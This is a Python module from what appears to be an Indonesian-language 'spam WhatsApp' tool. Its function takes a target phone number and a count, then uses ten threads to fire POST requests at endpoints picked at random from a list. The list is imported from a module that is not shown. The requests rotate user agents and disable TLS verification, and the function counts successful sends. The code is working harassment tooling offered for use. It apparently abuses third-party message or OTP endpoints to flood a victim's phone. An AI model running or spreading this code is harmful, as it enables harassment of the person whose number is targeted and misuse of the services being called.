#!/usr/bin/env python3
# modules/spam_wa.py

import requests
import concurrent.futures
import time
import random
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from endpoints import WA_ENDPOINTS, get_random_ua, normalize_phone

def spam_wa(phone, jumlah, threads=10):
    """Spam WhatsApp ke nomor target"""
    phone = normalize_phone(phone)
    sukses = 0
    gagal = 0
    
    print(f"\n[+] Spam WhatsApp ke {phone}")
    print(f"[+] Jumlah: {jumlah} | Threads: {threads}\n")
    
    requests.packages.urllib3.disable_warnings()
    
    def kirim(endpoint):
        try:
            ua = get_random_ua()
            resp = requests.post(
                endpoint["url"],
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest"
                },
                json=endpoint["params"](phone),
                timeout=20,
                verify=False,
                allow_redirects=True
            )
            return endpoint["name"], resp.status_code
        except:
            return endpoint["name"], "ERROR"
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(jumlah):
            endpoint = random.choice(WA_ENDPOINTS)
            futures.append(executor.submit(kirim, endpoint))
            time.sleep(0.2)
        
        for future in concurrent.futures.as_completed(futures):
            name, status = future.result()
            if status in [200, 201, 202]:
                sukses += 1
                print(f"[✓] {name}: {status}")
            else:
                gagal += 1
                print(f"[✗] {name}: {status}")
    
    print(f"\n[+] Selesai. Sukses: {sukses} | Gagal: {gagal}")
    return sukses > 0
